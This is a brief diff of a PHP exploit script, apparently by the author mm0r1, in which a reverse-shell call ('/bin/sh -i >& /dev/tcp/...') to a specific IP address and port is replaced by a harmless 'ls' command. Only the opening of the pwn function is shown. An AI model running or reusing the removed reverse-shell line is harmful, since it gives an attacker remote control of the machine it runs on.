@@ -8,7 +8,7 @@
 #
 # Author: https://github.com/mm0r1
 
-pwn('/bin/sh -i >& /dev/tcp/34.64.51.26/8778 0>&1');
+pwn('ls');
 
 function pwn($cmd) {
     define('LOGGING', false);
